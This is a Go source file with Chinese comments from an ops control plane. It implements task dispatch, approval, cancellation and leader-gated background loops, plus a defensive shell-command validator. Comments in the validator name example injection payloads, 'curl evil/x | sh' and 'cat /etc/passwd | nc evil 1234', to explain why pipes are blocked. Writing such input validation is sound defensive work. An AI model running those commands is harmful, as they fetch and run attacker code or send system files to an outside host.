// server_tasks.go 任务相关 HTTP handler 与后台循环。
//
// 从 server.go 拆分而来（按路由域拆分巨型 server.go）。
// 包含任务下发/列表/取消/审批等端点，以及定时调度/归档/租约回收/选主等后台循环，
// 逻辑未做任何修改。
package controlplane

import (
	"opsmesh/internal/controlplane/paginate"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"opsmesh/internal/domain"
	"opsmesh/internal/events"
	"opsmesh/internal/logx"
	"opsmesh/internal/proto"
)

// sanitizeAuditDetail 对写入审计/事件 Detail 的用户输入做脱敏与规范化：
//   - 移除换行符（\n→空格、\r→删除），防日志注入/解析错位；
//   - 截断超过 200 字符的内容，避免长命令撑爆日志、可能携带的敏感尾部外泄。
//
// 仅用于含用户原始输入（body.Command / body.Reason）的 Detail；固定字符串无需调用。
func sanitizeAuditDetail(s string) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\r", "")
	if len(s) > 200 {
		s = s[:200] + "..."
	}
	return s
}

// maxCommandLen 控制面侧命令长度上限（安全加固纵深防御）。
// 超过此长度的命令几乎不可能是合法运维操作，更可能是注入载荷或二进制 blob。
const maxCommandLen = 4096

// validateCommand 控制面侧命令内容校验（安全加固纵深防御）。
// 与 agent 端 checkShellMetachars 保持一致的元字符拦截策略，在控制面侧提前拦截，
// 避免恶意命令进入任务队列后被 agent 拉取执行（即使 agent 端校验被绕过或未启用白名单）。
//
// 校验项：
//   - 非空（调用方应已校验，此处兜底）。
//   - 长度 <= maxCommandLen（4096），防超长命令撑爆存储/日志或携带二进制载荷。
//   - 不含危险 shell 元字符：换行符 \n \r、分号 ;、命令替换 $() `、单个 &（后台执行）、
//     管道符 |（安全加固：拦截管道符防 `curl evil/x | sh` 这类管道注入）。
//   - 允许的合法模式：&&（命令链接符，第 81 行特殊处理）、>& / &>（重定向操作符）。
//
// 安全考量（管道符拦截）：
//   - 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh`、`cat /etc/passwd | nc evil 1234`
//     等管道注入载荷可过校验。管道符是 shell 注入高频载体，控制面侧应默认拦截。
//   - 合法运维场景极少需要在单条任务命令中使用管道（如需复合命令应拆分为多任务或用脚本）；
//     若确有需求，可经审批后通过脚本任务（type=script）下发，而非 shell 单命令。
//   - && 保留允许：作为合法命令链接符已在下方特殊处理（与 agent 端策略一致），
//     且 && 短路语义不引入任意命令执行（左侧失败则右侧不执行，无管道的数据流注入风险）。
//
// 注意：这是纵深防御的第一道闸（控制面侧），不替代 agent 端 checkShellMetachars。
// 两端均拦截可降低单点绕过风险：控制面被攻陷时 agent 端兜底，agent 端有 bug 时控制面侧兜底。
func validateCommand(command string) error {
	if command == "" {
		return errors.New("command is empty")
	}
	if len(command) > maxCommandLen {
		return fmt.Errorf("command too long (max %d bytes, got %d)", maxCommandLen, len(command))
	}
	// 与 agent 端 checkShellMetachars 一致的元字符拦截。
	if strings.Contains(command, "\n") {
		return errors.New("command contains newline metacharacter ('\\n'): rejected")
	}
	if strings.Contains(command, "\r") {
		return errors.New("command contains carriage return metacharacter ('\\r'): rejected")
	}
	if strings.Contains(command, ";") {
		return errors.New("command contains command separator metacharacter (';'): rejected")
	}
	if strings.Contains(command, "$(") {
		return errors.New("command contains command substitution metacharacter ('$()'): rejected")
	}
	if strings.Contains(command, "`") {
		return errors.New("command contains backtick metacharacter: rejected")
	}
	// 安全加固：拦截管道符 |，防 `curl evil/x | sh` 这类管道注入。
	// 原实现暂不拦截管道符，导致管道注入载荷可过校验；现已默认拦截。
	if strings.Contains(command, "|") {
		return errors.New("command contains pipe metacharacter ('|'): rejected")
	}
	// 检测单个 &（后台执行），允许合法模式 &&、>&、&>（与 agent 端逻辑一致）。
	cmd := command
	cmd = strings.ReplaceAll(cmd, ">&", "")
	cmd = strings.ReplaceAll(cmd, "&>", "")
	cmd = strings.ReplaceAll(cmd, "&&", "")
	if strings.Contains(cmd, "&") {
		return errors.New("command contains background operator metacharacter ('&'): rejected")
	}
	return nil
}

// handleCreateTask 处理 POST /api/v1/tasks：内部下发入口。
// 请求体：{ "agentID": "...", "type": "shell", "command": "...", "tenantID": "可选" }
// 租户隔离：任务只能下发给本租户（网关注入）的 agent；缺失则按 body.tenantID 兜底。
func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		paginate.JSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	// 联邦入站验签：带转发标记的请求必须验签，防跨不可信网段伪造租户身份。
	if err := s.verifyFederationRequest(r); err != nil {
		paginate.WriteJSON(w, http.StatusUnauthorized, map[string]string{"error": err.Error()})
		return
	}
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:write"); !ok {
		return
	}
	var body struct {
		AgentID          string `json:"agentID"`
		Type             string `json:"type"`
		Command          string `json:"command"`
		TenantID         string `json:"tenantID"`
		Schedule         string `json:"schedule"`         // F4 可选：5 字段 cron，设定则成为模板任务（周期派生实例）
		ApprovalRequired bool   `json:"approvalRequired"` // 修复 10：高风险任务需审批后才可执行
		MaxRetries       *int   `json:"maxRetries"`       // F2 可选：单任务重试上限覆盖（nil=用全局默认）
	}
	if err := decodeJSONBody(w, r, &body); err != nil {
		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
		return
	}
	if body.AgentID == "" || body.Command == "" {
		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "agentID and command are required"})
		return
	}
	if body.Type == "" {
		body.Type = "shell"
	}
	// 安全加固纵深防御：控制面侧命令内容校验。
	// 仅对 shell 类型任务校验 command（file 类型任务的 command 字段无 shell 语义）。
	// 与 agent 端 checkShellMetachars 保持一致的元字符拦截策略，在控制面侧提前拦截，
	// 避免恶意命令进入任务队列。校验失败返回 400 Bad Request。
	if body.Type == "shell" {
		if err := validateCommand(body.Command); err != nil {
			paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "command validation failed: " + err.Error()})
			return
		}
	}
	// 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
	targetTenant := actx.TenantID
	agent := s.lookupAgent(body.AgentID)
	if agent == nil || (targetTenant != "" && agent.TenantID != targetTenant) {
		paginate.WriteJSON(w, http.StatusForbidden, map[string]string{"error": "agent not found or tenant mismatch"})
		return
	}
	// F2 失败重试上限随任务下发（store 层按策略重入队/死信）。
	// 单任务可经 body.maxRetries 覆盖（如测试用 0 即一次失败进死信）；nil 用全局默认。
	maxRetries := s.cfg.TaskMaxRetries
	if body.MaxRetries != nil {
		maxRetries = *body.MaxRetries
		if maxRetries < 0 {
			maxRetries = 0
		}
	}
	task := s.store.CreateTask(&proto.Task{
		AgentID:          body.AgentID,
		TenantID:         targetTenant,
		Type:             body.Type,
		Command:          body.Command,
		Schedule:         body.Schedule, // F4 模板任务（cron）随创建下传
		MaxRetries:       maxRetries,
		ApprovalRequired: body.ApprovalRequired, // 修复 10：高风险任务需审批
	})
	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
	s.audit(r.Context(), &proto.AuditEvent{
		TenantID: targetTenant,
		UserID:   actx.UserID,
		Action:   "create_task",
		Target:   task.TaskID,
		Detail:   sanitizeAuditDetail(body.Command),
	})
	// 事件总线+ 队列深度观测。
	if s.bus != nil {
		s.bus.Publish(r.Context(), events.Event{
			TenantID: targetTenant, UserID: actx.UserID,
			Action: "create_task", Target: task.TaskID, Detail: sanitizeAuditDetail(body.Command), Level: events.LevelInfo,
		})
	}
	if s.metrics != nil {
		s.metrics.SetQueueDepth(s.store.PendingDepth())
	}
	// SSE：通知前端新任务已创建（前端任务表追加一行 pending）
	// 租户隔离：携带 targetTenant，仅同租户订阅者收到。
	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
	s.publishEvent(r.Context(), "task_status", targetTenant, map[string]string{
		"taskID":  task.TaskID,
		"status":  task.Status,
		"agentID": body.AgentID,
	})
	paginate.WriteJSON(w, http.StatusCreated, task)
}

// handleListTasks 统一处理 /api/v1/tasks：
//   - GET：列出任务（租户隔离 + 可选 ?status= 过滤 + 修复 3 分页），经 domain 防腐层对外暴露领域模型。
//   - POST：下发给指定 agent（逻辑复用 handleCreateTask，内部下发入口）。
func (s *Server) handleListTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodPost {
		s.handleCreateTask(w, r)
		return
	}
	if r.Method != http.MethodGet {
		paginate.JSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:read"); !ok {
		return
	}
	status := r.URL.Query().Get("status")
	tasks := s.store.AllTasks(actx.TenantID)
	out := make([]*domain.Task, 0, len(tasks))
	for _, t := range tasks {
		if status != "" && t.Status != status {
			continue
		}
		out = append(out, domain.TaskFromProto(t))
	}
	// 修复 3：分页（向后兼容：不传 page 返回全量）。
	page, pageSize := paginate.ParsePagination(r.URL.Query())
	if page == 0 {
		paginate.WriteJSON(w, http.StatusOK, out)
		return
	}
	total := len(out)
	start := (page - 1) * pageSize
	if start >= total {
		start = total
	}
	end := start + pageSize
	if end > total {
		end = total
	}
	paginate.WriteJSON(w, http.StatusOK, paginate.PaginateResult{
		Data: out[start:end], Total: total, Page: page, PageSize: pageSize, HasMore: end < total,
	})
}

// scheduleLoop 周期性评估模板任务（F4 定时/周期调度）：每 30s 调一次
// reg.FireDueSchedules(now)，对到点（cron 匹配且本分钟未触发）的模板派生 pending 实例。
// ctx 取消即退出。
func (s *Server) scheduleLoop(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if !s.store.IsLeader() {
				continue // 非 leader 不派生，避免多副本重复派生定时实例
			}
			n := s.store.FireDueSchedules(time.Now())
			if n > 0 {
				logx.Info(ctx, "定时任务派生", "fired", n)
			}
		}
	}
}

// archiveLoop F5 离线超龄自动归档：每 60s 由 leader 扫描最后心跳早于
// ArchiveAgeMin 的 agent 对应设备（或孤儿设备），批量标记 retired。
// 仅 leader 执行（归档属协调任务，避免多副本重复归档）。
func (s *Server) archiveLoop(ctx context.Context) {
	if s.cfg.ArchiveAgeMin <= 0 {
		return // 关闭自动归档（仅手动 DELETE 退役）
	}
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if !s.store.IsLeader() {
				continue
			}
			n := s.store.RetireStaleDevices(time.Duration(s.cfg.ArchiveAgeMin) * time.Minute)
			if n > 0 {
				logx.Info(ctx, "离线设备自动归档", "archived", n)
			}
			if tc := s.store.CleanupTokens(1000); tc > 0 {
				logx.Info(ctx, "过期 install token 清理", "cleaned", tc)
			}
		}
	}
}

// reclaimLoop 周期性复位超期 running 任务（任务必达）：agent 领取后超过租约租期仍未
// 上报结果，视为失联，复位 pending 重新进入调度队列。ctx 取消即退出。
func (s *Server) reclaimLoop(ctx context.Context) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if !s.store.IsLeader() {
				continue // 非 leader 不回收，避免多副本重复复位 running 任务
			}
			n := s.store.ReclaimStaleTasks(time.Duration(s.cfg.TaskLeaseSec) * time.Second)
			if n > 0 {
				logx.Info(ctx, "任务租约回收", "reclaimed", n)
			}
			// P2-1：顺带清理终态 batch/canary，防止内存索引无界增长。
			// 终态+36h 兜底删除，进行中批次不被误删。
			s.batches.cleanupDoneBatches()
			// P2-2：顺带清理过期 refresh token（登录防爆破 + 内存/DB 容量）。
			if n := s.store.CleanupRefreshTokens(); n > 0 {
				logx.Info(ctx, "refresh token 过期清理", "cleaned", n)
			}
		}
	}
}

// leaderLoop 选主循环：每 LeaderTickSec 秒续租一次 leader 租约，
// 并通过日志在晋升/失去 leader 身份时打印一次（避免每 tick 刷屏）。
// 仅 leader 才会由 reclaimLoop/scheduleLoop（及后续 provision/离线归档循环）真正执行周期协调任务。
func (s *Server) leaderLoop(ctx context.Context) {
	tick := time.Duration(s.cfg.LeaderTickSec) * time.Second
	if tick <= 0 {
		tick = 5 * time.Second
	}
	ttl := time.Duration(s.cfg.LeaderTTLSec) * time.Second
	if ttl <= 0 {
		ttl = 15 * time.Second
	}
	ticker := time.NewTicker(tick)
	defer ticker.Stop()
	var wasLeader bool
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			isLeader := s.store.RenewLeadership(ttl)
			if isLeader != wasLeader {
				if isLeader {
					logx.Info(ctx, "晋升为 leader，开始执行周期协调任务", "ttl", ttl.String())
				} else {
					logx.Info(ctx, "失去 leader 身份，暂停周期协调任务（其他副本接管）")
				}
				wasLeader = isLeader
			}
		}
	}
}

// handleBatchCreateTasks 处理 POST /api/v1/tasks/batch：向多台 agent 批量下发同一任务模板（危点闭环）。
// 请求体：{ "targets":["a1","a2"], "type","command","content","path","tenantID" }
// 逐台 CreateTask（复用租户隔离校验与审计）；返回已创建任务 ID 与逐台失败条目。
func (s *Server) handleBatchCreateTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		paginate.JSONError(w, http.StatusMethodNotAllowed, "method not allowed")
		return
	}
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:write"); !ok {
		return
	}
	var body struct {
		Targets          []string `json:"targets"`
		Type             string   `json:"type"`
		Command          string   `json:"command"`
		Content          string   `json:"content"`
		Path             string   `json:"path"`
		TenantID         string   `json:"tenantID"`
		Schedule         string   `json:"schedule"`         // F4 可选：批量下发的任务模板也支持 cron
		ApprovalRequired bool     `json:"approvalRequired"` // 修复 10：批量下发也支持审批
	}
	if err := decodeJSONBody(w, r, &body); err != nil {
		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": err.Error()})
		return
	}
	if len(body.Targets) == 0 {
		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "targets is required (non-empty)"})
		return
	}
	if body.Command == "" {
		paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "command is required"})
		return
	}
	if body.Type == "" {
		body.Type = "shell"
	}
	// 安全加固纵深防御：控制面侧命令内容校验（与 handleCreateTask 一致）。
	// 批量下发影响面更大，更应在控制面侧提前拦截恶意命令。
	if body.Type == "shell" {
		if err := validateCommand(body.Command); err != nil {
			paginate.WriteJSON(w, http.StatusBadRequest, map[string]string{"error": "command validation failed: " + err.Error()})
			return
		}
	}
	// 认证防御：强制使用头中的租户 ID，忽略 body 中的 tenantID，防 body 覆盖头租户越权。
	targetTenant := actx.TenantID
	created := make([]string, 0, len(body.Targets))
	type fail struct {
		Target string `json:"target"`
		Error  string `json:"error"`
	}
	fails := make([]fail, 0)
	for _, tid := range body.Targets {
		agent := s.lookupAgent(tid)
		if agent == nil || (targetTenant != "" && agent.TenantID != targetTenant) {
			fails = append(fails, fail{Target: tid, Error: "agent not found or tenant mismatch"})
			continue
		}
		task := s.store.CreateTask(&proto.Task{
			AgentID:          tid,
			TenantID:         targetTenant,
			Type:             body.Type,
			Command:          body.Command,
			Content:          body.Content,
			Path:             body.Path,
			Schedule:         body.Schedule,         // F4 批量模板也支持 cron
			MaxRetries:       s.cfg.TaskMaxRetries,  // F2 批量下发同样带重试上限
			ApprovalRequired: body.ApprovalRequired, // 修复 10：批量下发也支持审批
		})
		// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
		s.audit(r.Context(), &proto.AuditEvent{
			TenantID: targetTenant,
			UserID:   actx.UserID,
			Action:   "create_task",
			Target:   task.TaskID,
			Detail:   sanitizeAuditDetail("batch:" + body.Command),
		})
		if s.bus != nil {
			s.bus.Publish(r.Context(), events.Event{
				TenantID: targetTenant, UserID: actx.UserID,
				Action: "create_task", Target: task.TaskID, Detail: sanitizeAuditDetail("batch:" + body.Command), Level: events.LevelInfo,
			})
		}
		created = append(created, task.TaskID)
		// SSE：批量下发也逐条推送 task_status（前端实时追加任务行）
		// 租户隔离：携带 targetTenant，仅同租户订阅者收到。
		// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
		s.publishEvent(r.Context(), "task_status", targetTenant, map[string]string{
			"taskID":  task.TaskID,
			"status":  task.Status,
			"agentID": tid,
		})
	}
	if s.metrics != nil {
		s.metrics.SetQueueDepth(s.store.PendingDepth())
	}
	paginate.WriteJSON(w, http.StatusCreated, map[string]interface{}{
		"count":   len(created),
		"created": created,
		"errors":  fails,
	})
}

// handleTaskRouting 统一分派 /api/v1/tasks/{id}/... 子路径：
//   - POST /api/v1/tasks/{id}/cancel：取消任务（F3）
//   - GET  /api/v1/tasks/{id}/result：查询单条执行结果（A5/F7）
//   - POST /api/v1/tasks/{id}/approve：审批通过任务（修复 10）
//   - POST /api/v1/tasks/{id}/reject：审批拒绝任务（修复 10）
func (s *Server) handleTaskRouting(w http.ResponseWriter, r *http.Request) {
	idAndRest := strings.TrimPrefix(r.URL.Path, "/api/v1/tasks/")
	parts := strings.SplitN(idAndRest, "/", 2)
	id := parts[0]
	if id == "" {
		paginate.JSONError(w, http.StatusBadRequest, "task id required")
		return
	}
	switch {
	case len(parts) == 2 && parts[1] == "cancel" && r.Method == http.MethodPost:
		s.handleCancelTask(w, r, id)
	case len(parts) == 2 && parts[1] == "result" && r.Method == http.MethodGet:
		s.handleTaskResult(w, r, id)
	case len(parts) == 2 && parts[1] == "approve" && r.Method == http.MethodPost:
		s.handleApproveTask(w, r, id)
	case len(parts) == 2 && parts[1] == "reject" && r.Method == http.MethodPost:
		s.handleRejectTask(w, r, id)
	default:
		paginate.WriteJSON(w, http.StatusNotFound, map[string]string{"error": "not found", "path": r.URL.Path})
	}
}

// handleCancelTask 处理 POST /api/v1/tasks/{id}/cancel：取消 pending/running 任务（F3）。
// 租户隔离：requireAuth 时强制用网关注入租户，禁止越权取消他租户任务。
func (s *Server) handleCancelTask(w http.ResponseWriter, r *http.Request, id string) {
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:cancel"); !ok {
		return
	}
	tenant := actx.TenantID
	ok = s.store.CancelTask(id, tenant)
	if !ok {
		paginate.WriteJSON(w, http.StatusNotFound, map[string]string{"error": "task not cancellable (not found / not pending|running / tenant mismatch)"})
		return
	}
	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
	s.audit(r.Context(), &proto.AuditEvent{
		TenantID: tenant, UserID: actx.UserID, Action: "cancel_task", Target: id, Detail: "cancelled via HTTP",
	})
	if s.bus != nil {
		s.bus.Publish(r.Context(), events.Event{
			TenantID: tenant, UserID: actx.UserID, Action: "cancel_task", Target: id, Level: events.LevelInfo,
		})
	}
	// SSE：通知前端任务已取消（任务表对应行状态翻 cancelled）
	// 租户隔离：携带 tenant，仅同租户订阅者收到。
	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
	s.publishEvent(r.Context(), "task_status", tenant, map[string]string{
		"taskID": id,
		"status": "cancelled",
	})
	paginate.WriteJSON(w, http.StatusOK, map[string]string{"status": "cancelled", "taskID": id})
}

// handleTaskResult 处理 GET /api/v1/tasks/{id}/result：返回单条执行结果（A5/F7）。
// 租户隔离：requireAuth 时仅返回本租户任务的结果（通过任务的租户归属判定）。
func (s *Server) handleTaskResult(w http.ResponseWriter, r *http.Request, id string) {
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:read"); !ok {
		return
	}
	res := s.store.TaskResult(id)
	if res == nil {
		paginate.WriteJSON(w, http.StatusNotFound, map[string]string{"error": "result not found"})
		return
	}
	// 租户隔离：结果对应的任务须属于当前租户（requireAuth 时强制）。
	// 经 TaskByID 索引 O(1) 直查任务并校验租户归属，避免遍历 AllTasks（原 O(N)）。
	if actx.TenantID != "" {
		t := s.store.TaskByID(id)
		if t == nil || t.TenantID != actx.TenantID {
			paginate.WriteJSON(w, http.StatusForbidden, map[string]string{"error": "tenant mismatch"})
			return
		}
	}
	paginate.WriteJSON(w, http.StatusOK, domain.TaskResultFromProto(res))
}

// ============================================================================
// 修复 10：作业审批 API
// ============================================================================

// handleApproveTask 处理 POST /api/v1/tasks/{id}/approve：审批通过任务。
// 将 pending_approval 状态的任务翻为 pending，使其可被 agent 领取执行。
func (s *Server) handleApproveTask(w http.ResponseWriter, r *http.Request, id string) {
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:approve"); !ok {
		return
	}
	if !s.store.ApproveTask(id, actx.TenantID, actx.UserID) {
		paginate.WriteJSON(w, http.StatusNotFound, map[string]string{"error": "task not found, not pending_approval, or tenant mismatch"})
		return
	}
	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
	s.audit(r.Context(), &proto.AuditEvent{
		TenantID: actx.TenantID, UserID: actx.UserID, Action: "approve_task", Target: id,
		Detail: "approved via HTTP",
	})
	if s.bus != nil {
		s.bus.Publish(r.Context(), events.Event{
			TenantID: actx.TenantID, UserID: actx.UserID, Action: "approve_task", Target: id, Level: events.LevelInfo,
		})
	}
	// SSE：通知前端任务已审批通过。
	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
	s.publishEvent(r.Context(), "task_status", actx.TenantID, map[string]string{
		"taskID": id,
		"status": "pending",
	})
	paginate.WriteJSON(w, http.StatusOK, map[string]string{"status": "approved", "taskID": id})
}

// handleRejectTask 处理 POST /api/v1/tasks/{id}/reject：审批拒绝任务。
// 将 pending_approval 状态的任务翻为 rejected（终态，不可执行）。
// 请求体（可选）：{"reason": "..."}
func (s *Server) handleRejectTask(w http.ResponseWriter, r *http.Request, id string) {
	actx, ok := s.requireTenantContext(w, r)
	if !ok {
		return
	}
	if _, ok := s.requireProd(w, r, "task:approve"); !ok {
		return
	}
	var body struct {
		Reason string `json:"reason"`
	}
	if err := decodeJSONBody(w, r, &body); err != nil && err != io.EOF {
		log.Printf("controlplane: handleRejectTask 解析请求体失败: %v", err)
	}
	if !s.store.RejectTask(id, actx.TenantID, actx.UserID) {
		paginate.WriteJSON(w, http.StatusNotFound, map[string]string{"error": "task not found, not pending_approval, or tenant mismatch"})
		return
	}
	// 携带 ctx 的 trace_id，使审计日志与链路追踪关联。
	s.audit(r.Context(), &proto.AuditEvent{
		TenantID: actx.TenantID, UserID: actx.UserID, Action: "reject_task", Target: id,
		Detail: sanitizeAuditDetail("rejected via HTTP: " + body.Reason),
	})
	if s.bus != nil {
		s.bus.Publish(r.Context(), events.Event{
			TenantID: actx.TenantID, UserID: actx.UserID, Action: "reject_task", Target: id, Level: events.LevelInfo,
		})
	}
	// SSE：通知前端任务已审批拒绝。
	// 携带 ctx 的 trace_id，使 SSE 事件与链路追踪关联。
	s.publishEvent(r.Context(), "task_status", actx.TenantID, map[string]string{
		"taskID": id,
		"status": "rejected",
	})
	paginate.WriteJSON(w, http.StatusOK, map[string]string{"status": "rejected", "taskID": id})
}
